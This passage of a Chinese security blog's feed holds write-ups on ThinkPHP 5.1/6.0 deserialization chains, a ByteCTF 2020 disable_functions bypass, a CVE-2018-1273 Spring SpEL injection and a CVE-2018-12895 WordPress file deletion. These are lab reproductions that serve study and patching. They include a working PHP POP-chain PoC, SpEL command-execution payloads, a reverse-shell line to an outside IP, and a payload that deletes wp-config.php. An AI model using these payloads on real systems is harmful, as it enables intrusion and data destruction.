class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;226149.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;caiqiiqi&#x2F;article&#x2F;details&#x2F;104943640</span><br><span class="line">https:&#x2F;&#x2F;www.00theway.org&#x2F;2020&#x2F;01&#x2F;04&#x2F;apereo-cas-rce&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Apereo-CAS-4-1-反序列化命令执行&quot;&gt;&lt;a href=&quot;#Apereo-CAS-4-1-反序列化命令执行&quot; class=&quot;headerlink&quot; title=&quot;Apereo-CAS-4.1-反序列化命令执行&quot;&gt;&lt;/a&gt;Apereo-CAS-4.1-反序列化命令执行
    
    </summary>
    
    
    
      <category term="maven" scheme="http://yoursite.com/tags/maven/"/>
    
  </entry>
  
  <entry>
    <title>tp6unserialize</title>
    <link href="http://yoursite.com/2020/11/04/tp6unserialize/"/>
    <id>http://yoursite.com/2020/11/04/tp6unserialize/</id>
    <published>2020-11-04T10:30:14.000Z</published>
    <updated>2020-11-10T13:12:45.272Z</updated>
    
    <content type="html"><![CDATA[<h3 id="tp6-0反序列化链子"><a href="#tp6-0反序列化链子" class="headerlink" title="tp6.0反序列化链子"></a>tp6.0反序列化链子<a id="more"></a></h3><p>有了<code>tp5.0.x</code>的经验，会好很多</p><p>还是<code>__destruct()</code>析构函数起手，<code>vendor/topthink/think-orm/src/Model.php</code>可用</p><img src="/2020/11/04/tp6unserialize/1.png" class=""><p>根据逻辑判断只有让<code>$this-&gt;lazySave</code>为<code>True</code>，才能进入<code>save()</code>，跟进</p><img src="/2020/11/04/tp6unserialize/2.png" class=""><p>可用方法为<code>updateData</code>，前面的<code>if</code>判断就不能让它成立,即下面的条件</p><ul><li><code>$this-&gt;isEmpty()</code>要返回false</li><li><code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>要返回true</li><li><code>$this-&gt;exists</code>返回为true</li></ul><img src="/2020/11/04/tp6unserialize/3.png" class=""><p><code>data</code>为非空数组</p><img src="/2020/11/04/tp6unserialize/4.png" class=""><p><code>$this-&gt;withEvent</code>简单可控，让其为false就能够返回true</p><p>下面跟一下<code>updateData</code>方法</p><img src="/2020/11/04/tp6unserialize/5.png" class=""><p>需要绕过<code>return</code>，这里的<code>$data=$this-&gt;getChangeData()</code>要为非空</p><img src="/2020/11/04/tp6unserialize/6.png" class=""><p>这里让<code>$this-&gt;force</code>为true，直接返回前面构造的非空<code>$this-&gt;data</code></p><p>接着来看<code>checkAllowFields</code>,跟进</p><img src="/2020/11/04/tp6unserialize/7.png" class=""><p>这里的<code>$this-&gt;field</code>和<code>$this-&gt;schema</code>默认为空，条件成立进入else语句,跟进<code>db()</code></p><img src="/2020/11/04/tp6unserialize/8.png" class=""><p><code>db</code>中进行了字符串的拼接，也就是说<code>$this-&gt;name</code>或者<code>$this-&gt;suffix</code>为类对象时，就会触发<code>__toString()</code>方法</p><p>下面用到的还是 <code>Conversion</code>类中的 <code>__toString-&gt;toJson-&gt;toArray</code>一条,然后就到了 <code>getAttr</code>方法了</p><img src="/2020/11/04/tp6unserialize/9.png" class=""><p>下面接着跟进</p><img src="/2020/11/04/tp6unserialize/10.png" class=""><img src="/2020/11/04/tp6unserialize/11.png" class=""><p>满足<code>$this-&gt;withAttr[$key]</code>存在且<code>$this-&gt;withAttr[$key]</code>不为数组就可以触发命令执行</p><p>最终会把<code>$this-&gt;withAttr[$key]</code>作为函数名动态执行函数，而<code>$value</code>作为参数，就可以利用执行系统函数达到命令执行</p><p>pop调用链</p><img src="/2020/11/04/tp6unserialize/13.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POC</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [<span class="string">"peguin"</span> =&gt; <span class="string">"whoami"</span>];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"peguin"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">protected</span> $withEvent;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $force;</span><br><span class="line">    <span class="keyword">protected</span> $table;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure><img src="/2020/11/04/tp6unserialize/12.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;tp6-0反序列化链子&quot;&gt;&lt;a href=&quot;#tp6-0反序列化链子&quot; class=&quot;headerlink&quot; title=&quot;tp6.0反序列化链子&quot;&gt;&lt;/a&gt;tp6.0反序列化链子
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
  <entry>
    <title>byteCTF2020</title>
    <link href="http://yoursite.com/2020/11/04/byteCTF2020/"/>
    <id>http://yoursite.com/2020/11/04/byteCTF2020/</id>
    <published>2020-11-04T05:27:32.000Z</published>
    <updated>2020-11-04T06:35:03.224Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛web题好难，盯着爬虫那题，还是没整出来，来复现吧<a id="more"></a></p><h3 id="Wallbreaker-2020"><a href="#Wallbreaker-2020" class="headerlink" title="Wallbreaker 2020"></a>Wallbreaker 2020</h3><p>这道题官方的预期解估计会在决赛之后放出来，当时好像就1解</p><p>题目的给的源码很简单，但是…看题吧</p><img src="/2020/11/04/byteCTF2020/1.png" class=""><p>下意识会先去看<code>phpinfo</code>,找到<code>disable_function</code></p><img src="/2020/11/04/byteCTF2020/2.png" class=""><p>预料之中，基本上把命令执行的方法都ban完了</p><p>后面想着用<code>file_put_contents</code>写个小马进去用蚁剑连一下看看，突然发现题目已经给了，那就直接连吧</p><p>连上之后，只有<code>/var/www/html</code>有可读权限，其他路径都没权限访问</p><p>这里想到之前碰到的用<code>glob://</code>协议可以读取目录中的文件</p><img src="/2020/11/04/byteCTF2020/3.png" class=""><p>直接用<code>php</code>手册里的exp就行</p><img src="/2020/11/04/byteCTF2020/4.png" class=""><p>可以看到在根目录下面有<code>flag</code>和<code>readflag</code>文件</p><p>下面就是要想办法调用<code>readflag</code>，这样应该就能拿到flag了</p><p>由于预期解不用<code>pwn</code>，这里就用非预期解的来做,根据官方<code>wp</code>中给出的链接去看看非预期exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mm0r1&#x2F;exploits&#x2F;blob&#x2F;master&#x2F;php7-backtrace-bypass&#x2F;exploit.php</span><br></pre></td></tr></table></figure><p>这个exp之前就有用过的，先直接试试，但是问题来了，没办法上传</p><p>这里要用到上面看到根路径下的文件，尝试访问<code>/tmp</code>，成功进入，并且可读可写</p><img src="/2020/11/04/byteCTF2020/5.png" class=""><p>尝试包含上传的exp，包含失败</p><img src="/2020/11/04/byteCTF2020/6.png" class=""><p>根据官方文档的提示，把24行改为<code>(new Error)-&gt;getTrace()</code>,再次上传</p><img src="/2020/11/04/byteCTF2020/7.png" class=""><p>下面只要把执行的命令改成<code>/readflag</code>，再包含即可</p><img src="/2020/11/04/byteCTF2020/8.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛web题好难，盯着爬虫那题，还是没整出来，来复现吧
    
    </summary>
    
    
    
      <category term="byte" scheme="http://yoursite.com/tags/byte/"/>
    
  </entry>
  
  <entry>
    <title>tp5.1.x-unserialize</title>
    <link href="http://yoursite.com/2020/11/02/tp5-1-x-unserialize/"/>
    <id>http://yoursite.com/2020/11/02/tp5-1-x-unserialize/</id>
    <published>2020-11-02T11:08:58.000Z</published>
    <updated>2020-11-02T14:09:59.785Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tp5-1-x反序列化链子"><a href="#tp5-1-x反序列化链子" class="headerlink" title="tp5.1.x反序列化链子"></a>tp5.1.x反序列化链子<a id="more"></a></h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7.1+Apache+thinkphp5.1.29</span><br></pre></td></tr></table></figure><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><p>一般来说序列化得题都是从析构函数入手，也就是<code>__destruct()</code>，全局搜索，排查可以发现可以利用的在<code>Windows.php</code></p><img src="/2020/11/02/tp5-1-x-unserialize/1.png" class=""><p>跟进<code>removeFiles()</code></p><img src="/2020/11/02/tp5-1-x-unserialize/2.png" class=""><p>可以看到存在<code>file_exists()</code>函数，当把<code>$filename</code>参数当作字符串处理时可以触发<code>__toString()</code>魔术方法，全局查找<code>__toString()</code></p><p>找到了<code>thinkphp\library\think\model\concern</code>下的Conversion.php</p><img src="/2020/11/02/tp5-1-x-unserialize/3.png" class=""><p><code>__toString()</code>会返回调用<code>toJson()</code>方法，跟进</p><img src="/2020/11/02/tp5-1-x-unserialize/4.png" class=""><p>接着会调用<code>toArray()</code>方法，继续跟进看一下该方法，我们要寻找<code>$a-&gt;function($b)</code>形式的点，$a要为可控变量，$b为可控参数</p><p>这里找到了<code>$relation-&gt;visible($name)</code></p><img src="/2020/11/02/tp5-1-x-unserialize/5.png" class=""><p>下面要看<code>$relation</code>和<code>$name</code>是否可控</p><p><code>$relation = $this-&gt;getAttr($key)</code>，跟进<code>getAttr()</code>,<code>$relation</code>变量由<code>getAttr</code>获取，<code>$this-&gt;getData</code>控制<code>$relation</code>变量</p><img src="/2020/11/02/tp5-1-x-unserialize/6.png" class=""><img src="/2020/11/02/tp5-1-x-unserialize/7.png" class=""><p>由于<code>Conversion.php</code>用的是<code>trait</code>类(trait是用来实现代码的复用的，不可以被实例化也不可以被继承),所以要找到复用了该类的点</p><img src="/2020/11/02/tp5-1-x-unserialize/8.png" class=""><p>没有别的类存在可利用的<code>visible</code>，下面就要找<code>__call()</code>魔术方法，全局搜索找到了<code>Request</code>类</p><img src="/2020/11/02/tp5-1-x-unserialize/9.png" class=""><p>这里可以利用<code>call_user_func_array</code>进行命令执行，但是这里不能直接利用，<code>$args</code>会被<code>array_inshift</code>插入一个类对象，执行只会失败。<code>Request</code>类中的<code>input</code>方法，调用相当于调用了<code>call_user_func($filter,$data)</code>,这可以跟进<code>filtervalue</code>发现，下面就是看一下调用了<code>input</code>方法的函数方法，可以找到<code>param()</code>调用了<code>input</code>方法，下面找调用了<code>param</code>方法的方法，找到了<code>isAjax()</code>方法</p><img src="/2020/11/02/tp5-1-x-unserialize/10.png" class=""><p><code>$config[&#39;var_ajax&#39;]</code>控制<code>param</code>的<code>$name</code>参数是<code>isAjax</code>方法中<code>param</code>方法的<code>$name</code>,也就控制了<code>$this-&gt;param</code>,由此就控制了<code>input</code>方法的<code>$data</code>参数，然后<code>$filter</code>变量是可控的</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;tp5-1-x反序列化链子&quot;&gt;&lt;a href=&quot;#tp5-1-x反序列化链子&quot; class=&quot;headerlink&quot; title=&quot;tp5.1.x反序列化链子&quot;&gt;&lt;/a&gt;tp5.1.x反序列化链子
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-1273-Spring_Data_Commons</title>
    <link href="http://yoursite.com/2020/10/31/CVE-2018-1273-Spring-Data-Commons/"/>
    <id>http://yoursite.com/2020/10/31/CVE-2018-1273-Spring-Data-Commons/</id>
    <published>2020-10-31T06:00:09.000Z</published>
    <updated>2020-10-31T11:56:31.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring-Data-Commons-远程命令执行漏洞"><a href="#Spring-Data-Commons-远程命令执行漏洞" class="headerlink" title="Spring Data Commons 远程命令执行漏洞"></a>Spring Data Commons 远程命令执行漏洞<a id="more"></a></h1><h3 id="Spring-Data-Commons简介"><a href="#Spring-Data-Commons简介" class="headerlink" title="Spring Data Commons简介"></a>Spring Data Commons简介</h3><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Spring Data Commons 1.13至1.13.10（Ingalls SR10）</li><li>Spring Data REST 2.6至2.6.10（Ingalls SR10）</li><li>Spring Data Commons 2.0到2.0.5（Kay SR5）</li><li>Spring Data REST 3.0到3.0.5（Kay SR5）</li><li>较旧的不受支持的版本也会受到影响</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点位于<code>MapPropertyAccessor</code>类的<code>setPropertyValue</code>方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapPropertyAccessor</span> <span class="keyword">extends</span> <span class="title">AbstractPropertyAccessor</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPropertyValue</span><span class="params">(String propertyName, @Nullable Object value)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.isWritableProperty(propertyName)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NotWritablePropertyException(<span class="keyword">this</span>.type, propertyName);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">                context.addPropertyAccessor(<span class="keyword">new</span> MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(<span class="keyword">this</span>.type, <span class="keyword">this</span>.conversionService));</span><br><span class="line">                context.setTypeConverter(<span class="keyword">new</span> StandardTypeConverter(<span class="keyword">this</span>.conversionService));</span><br><span class="line">                context.setRootObject(<span class="keyword">this</span>.map);</span><br><span class="line">                Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line">                PropertyPath leafProperty = <span class="keyword">this</span>.getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">                TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">                TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span><br><span class="line">                propertyType = propertyName.endsWith(<span class="string">"]"</span>) ? propertyType.getActualType() : propertyType;</span><br><span class="line">                <span class="keyword">if</span> (propertyType != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line">                    PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());</span><br><span class="line">                    <span class="keyword">if</span> (descriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(String.format(<span class="string">"Couldn't find PropertyDescriptor for %s on %s!"</span>, leafProperty.getSegment(), owningType.getType()));</span><br><span class="line">                    &#125;</span><br><span class="line">                    MethodParameter methodParameter = <span class="keyword">new</span> MethodParameter(descriptor.getReadMethod(), -<span class="number">1</span>);</span><br><span class="line">                    TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">if</span> (typeDescriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(String.format(<span class="string">"Couldn't obtain type descriptor for method parameter %s!"</span>, methodParameter));</span><br><span class="line">                    &#125;</span><br><span class="line">                    value = <span class="keyword">this</span>.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">                &#125;</span><br><span class="line">                expression.setValue(context, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>单从代码分析来看，整个流程是这样的</p><ul><li><code>isWritableProperty</code>检验参数名</li><li>创建<code>StandardEvaluationContext</code>,<code>PARSER.parseExpression</code>设置要解析的表达试的值为函数传入参数</li><li>最后通过<code>expression.setValue</code>进行了<code>spel</code>表达试的解析</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以下载官方示例程序</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;spring-projects&#x2F;spring-data-examples</span><br><span class="line">这里需要倒退版本</span><br></pre></td></tr></table></figure><p>借用参考文章中得代码了</p><p>当执行传入得payload时，在 <code>spel</code>中有两个变量可以访问，为<code>#this</code> 和<code>#root</code>， 我们可以通过<code>#this</code>以反射的方式执行命令</p><p><code>POST</code>请求中得参数部分，经过<code>isWritableProperty</code>校验之后会调用<code>getPropertyPath</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> PropertyPath <span class="title">getPropertyPath</span><span class="params">(String propertyName)</span> </span>&#123;</span><br><span class="line">           String plainPropertyPath = propertyName.replaceAll(<span class="string">"\\[.*?\\]"</span>, <span class="string">""</span>);</span><br><span class="line">           <span class="keyword">return</span> PropertyPath.from(plainPropertyPath, <span class="keyword">this</span>.type);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>这个函数存在逻辑漏洞，经过这个正则之后，传入的<code>name</code>和<code>name[]</code>会返回一样的东西，然后判断<code>plainPropertyPath</code>是不是<code>this.type（contriller用于接受参数的类）</code>中的属性</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">装有docker的centos</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;</span><br><span class="line">&#x2F;spring&#x2F;CVE-2018-1273下</span><br><span class="line">docker-compose up -d</span><br><span class="line">拉取复现环境之后就可以开始了</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>正常访问地址下的<code>/users</code>,可以看到来到一个登录界面</p><img src="/2020/10/31/CVE-2018-1273-Spring-Data-Commons/1.png" class=""><p>在利用poc之前先进入docker容器中看一下<code>tmp</code>目录下的文件信息</p><img src="/2020/10/31/CVE-2018-1273-Spring-Data-Commons/2.png" class=""><p>下面利用给的poc</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure><p><code>exec</code>种执行的命令可以更改成别的</p><img src="/2020/10/31/CVE-2018-1273-Spring-Data-Commons/3.png" class=""><p>执行后，回到容器中进行查看目录下是否生成了<code>success</code>文件</p><img src="/2020/10/31/CVE-2018-1273-Spring-Data-Commons/4.png" class=""><p>可以看到命令成功执行了，试试弹个shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">username[#</span><span class="bash">this.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">"/bin/bash -c <span class="variable">$@</span>|bash 0 echo bash -i &gt;&amp;/dev/tcp/111.229.84.70/1 0&gt;&amp;1"</span>)]=&amp;password=&amp;repeatedPassword=</span></span><br></pre></td></tr></table></figure><p>没有弹回来，但是应该是可以的，之后可以再试试</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>2.0.x用户应升级到2.0.6</li><li>1.13.x用户应升级到1.13.11</li><li>较旧的版本应升级到受支持的分支</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tanzu.vmware.com&#x2F;security&#x2F;cve-2018-1273</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hac425&#x2F;p&#x2F;9656747.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Spring-Data-Commons-远程命令执行漏洞&quot;&gt;&lt;a href=&quot;#Spring-Data-Commons-远程命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;Spring Data Commons 远程命令执行漏洞&quot;&gt;&lt;/a&gt;Spring Data Commons 远程命令执行漏洞
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-12895</title>
    <link href="http://yoursite.com/2020/10/29/CVE-2018-12895/"/>
    <id>http://yoursite.com/2020/10/29/CVE-2018-12895/</id>
    <published>2020-10-29T13:03:17.000Z</published>
    <updated>2020-10-30T10:46:13.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Wordpress-lt-4-9-6-任意文件删除漏洞"><a href="#Wordpress-lt-4-9-6-任意文件删除漏洞" class="headerlink" title="Wordpress &lt;= 4.9.6 任意文件删除漏洞"></a>Wordpress &lt;= 4.9.6 任意文件删除漏洞<a id="more"></a></h2><h3 id="Wordpress简介"><a href="#Wordpress简介" class="headerlink" title="Wordpress简介"></a>Wordpress简介</h3><p>WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。WordPress具有插件架构和模板系统。Alexa排行前100万的网站中有超过16.7%的网站使用WordPress，根据w3tech的资料显示，约有30％的网站在使用它。WordPress是目前因特网上最流行的博客系统。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><h3 id="WORDPRESS-≤-4-9-6"><a href="#WORDPRESS-≤-4-9-6" class="headerlink" title="WORDPRESS ≤ 4.9.6"></a>WORDPRESS ≤ 4.9.6</h3><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>给出的github项目环境地址，可以用Vsplate起一个靶机环境</p><img src="/2020/10/29/CVE-2018-12895/1.png" class=""><p>在注册之后可以直接登录后台</p><img src="/2020/10/29/CVE-2018-12895/2.png" class=""><p>进入后台之后，左边栏目选择Media，Add new</p><img src="/2020/10/29/CVE-2018-12895/3.png" class=""><p>选择图片上传之后，点击edit</p><p>F12，搜索<code>post.php</code>，找到<code>_wpnonce</code>，记下该值</p><img src="/2020/10/29/CVE-2018-12895/4.png" class=""><p>下面要将<code>$meta[&#39;thumb&#39;]</code>设置成要删除的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">GET:http:<span class="comment">//37e7edd29225324ea69df6ea2dd27d25.n1.vsgo.cloud:11202/wp/wp-admin/post.php?post=6&amp;action=edit</span></span><br><span class="line">POST:action=editattachment&amp;_wpnonce=<span class="number">5563</span>cbbead&amp;thumb=../../../../wp-config.php</span><br></pre></td></tr></table></figure><img src="/2020/10/29/CVE-2018-12895/6.png" class=""><p>burp抓包看一下响应</p><img src="/2020/10/29/CVE-2018-12895/5.png" class=""><p>可以看到返回的是302，说明数据发送成功了，下面就是进行删除，点击删除按钮，抓包看一下响应</p><img src="/2020/10/29/CVE-2018-12895/7.png" class=""><p>可以看到返回的也是302，说明成功了</p><p>按照漏洞提交者提供的复现视频来看，这时候刷新页码会发现提示需要重新安装wordpress</p><img src="/2020/10/29/CVE-2018-12895/8.png" class=""><p>但是复现时尝试了十多次都没有达到同样的删除效果，开始以为是payload有问题，后来发现并不是，启用<code>VSPLATE</code>远程连接web终端，发现在<code>wp-includes/post.php</code>中漏洞利用的代码部分找不到了，也就不能成功利用该漏洞达到任意文件删除</p><p>可能这个在线平台的复现环境版本也不对，暂时先放放，后面有时间再找找</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞利用点在<code>wp-includes/post.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_delete_attachment</span><span class="params">( $post_id, $force_delete = false )</span> </span>&#123;</span><br><span class="line">⋮</span><br><span class="line">$meta = wp_get_attachment_metadata( $post_id );</span><br><span class="line">⋮</span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>($meta[<span class="string">'thumb'</span>]) ) &#123;</span><br><span class="line"><span class="comment">// Don't delete the thumb if another attachment uses it.</span></span><br><span class="line"><span class="keyword">if</span> (! $wpdb-&gt;get_row( $wpdb-&gt;prepare( <span class="string">"SELECT meta_id FROM $wpdb-&gt;postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id &lt;&gt; %d"</span>, <span class="string">'%'</span> . $wpdb-&gt;esc_like( $meta[<span class="string">'thumb'</span>] ) . <span class="string">'%'</span>, $post_id)) ) &#123;</span><br><span class="line">$thumbfile = str_replace(basename($file), $meta[<span class="string">'thumb'</span>], $file);</span><br><span class="line"><span class="comment">/** This filter is documented in wp-includes/functions.php */</span></span><br><span class="line">$thumbfile = apply_filters( <span class="string">'wp_delete_file'</span>, $thumbfile );</span><br><span class="line">@ unlink( path_join($uploadpath[<span class="string">'basedir'</span>], $thumbfile) );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 